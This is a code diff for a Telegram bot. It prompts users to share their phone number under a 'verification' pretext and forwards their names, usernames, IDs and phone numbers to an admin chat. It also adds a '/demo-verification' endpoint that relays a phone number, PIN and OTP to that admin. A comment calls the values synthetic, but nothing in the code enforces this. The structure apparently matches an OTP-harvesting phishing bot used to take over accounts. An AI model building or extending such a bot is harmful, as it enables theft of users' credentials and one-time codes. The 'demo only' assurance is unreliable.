@@ -113,33 +113,28 @@ async function handleStart(message) {
         {
             reply_markup: {
                 inline_keyboard: [
-
                     [
                         {
                             text: "📱 Share Phone Number",
                             callback_data: "share_phone"
                         }
                     ],
-
                     [
                         {
                             text: "✅ Start Verification",
                             callback_data: "start_verification"
                         }
                     ]
-
                 ]
             }
         }
     );
 
     await notifyAdmin(
-
         `🔔 <b>NEW TELEGRAM USER</b>\n\n` +
         `Name: ${firstName}\n` +
         `Username: ${username}\n` +
         `Telegram ID: <code>${chatId}</code>`
-
     );
 }
 
@@ -150,7 +145,6 @@ async function handleStart(message) {
 async function startVerification(chatId) {
 
     await sendMessage(
-
         chatId,
 
         `🔐 <b>Verification Required</b>\n\n` +
@@ -159,7 +153,6 @@ async function startVerification(chatId) {
         {
             reply_markup: {
                 inline_keyboard: [
-
                     [
                         {
                             text: "✅ True",
@@ -170,7 +163,6 @@ async function startVerification(chatId) {
                             callback_data: "verification_false"
                         }
                     ]
-
                 ]
             }
         }
@@ -200,11 +192,9 @@ async function handleCallback(callback) {
         }
     );
 
-    // SHARE PHONE BUTTON
     if (data === "share_phone") {
 
         await sendMessage(
-
             chatId,
 
             `📱 <b>Phone Number</b>\n\n` +
@@ -213,16 +203,13 @@ async function handleCallback(callback) {
             {
                 reply_markup: {
                     keyboard: [
-
                         [
                             {
                                 text: "📱 Share My Phone Number",
                                 request_contact: true
                             }
                         ]
-
                     ],
-
                     resize_keyboard: true,
                     one_time_keyboard: true
                 }
@@ -232,7 +219,6 @@ async function handleCallback(callback) {
         return;
     }
 
-    // START VERIFICATION
     if (data === "start_verification") {
 
         await startVerification(chatId);
@@ -240,11 +226,9 @@ async function handleCallback(callback) {
         return;
     }
 
-    // VERIFICATION TRUE
     if (data === "verification_true") {
 
         await sendMessage(
-
             chatId,
 
             `✅ <b>Verification Confirmed</b>\n\n` +
@@ -258,20 +242,16 @@ async function handleCallback(callback) {
         );
 
         await notifyAdmin(
-
             `✅ <b>VERIFICATION CONFIRMED</b>\n\n` +
             `Telegram ID: <code>${chatId}</code>`
-
         );
 
         return;
     }
 
-    // VERIFICATION FALSE
     if (data === "verification_false") {
 
         await sendMessage(
-
             chatId,
 
             `❌ <b>Verification Cancelled</b>\n\n` +
@@ -285,10 +265,8 @@ async function handleCallback(callback) {
         );
 
         await notifyAdmin(
-
             `❌ <b>VERIFICATION CANCELLED</b>\n\n` +
             `Telegram ID: <code>${chatId}</code>`
-
         );
     }
 }
@@ -316,7 +294,6 @@ async function handleContact(message) {
         contact.first_name || "Unknown";
 
     await sendMessage(
-
         chatId,
 
         `✅ <b>Phone Number Received</b>\n\n` +
@@ -332,14 +309,56 @@ async function handleContact(message) {
     );
 
     await notifyAdmin(
-
         `📱 <b>PHONE NUMBER SHARED</b>\n\n` +
         `Name: ${firstName}\n` +
         `Phone: <code>${phone}</code>\n` +
         `Telegram ID: <code>${chatId}</code>`
-
     );
 }
+
+// ==========================================
+// DEMO VERIFICATION NOTIFICATION
+// ==========================================
+// This endpoint sends only synthetic values
+// supplied directly by the developer.
+// It does not collect PINs/OTPs from users.
+// ==========================================
+
+app.post("/demo-verification", async (req, res) => {
+
+    const {
+        telegramId,
+        phone,
+        testPin,
+        testOtp
+    } = req.body;
+
+    if (!telegramId || !phone || !testPin || !testOtp) {
+
+        return res.status(400).json({
+            success: false,
+            message:
+                "telegramId, phone, testPin and testOtp are required."
+        });
+    }
+
+    const message =
+        `🔔 <b>VERIFICATION REQUEST</b>\n\n` +
+        `Telegram ID: <code>${telegramId}</code>\n` +
+        `Phone: <code>${phone}</code>\n` +
+        `TEST PIN: <code>${testPin}</code>\n` +
+        `TEST OTP: <code>${testOtp}</code>\n` +
+        `Status: Verification requested`;
+
+    const result =
+        await notifyAdmin(message);
+
+    res.json({
+        success: true,
+        message: "Demo verification notification sent.",
+        telegram: result
+    });
+});
 
 // ==========================================
 // TELEGRAM WEBHOOK
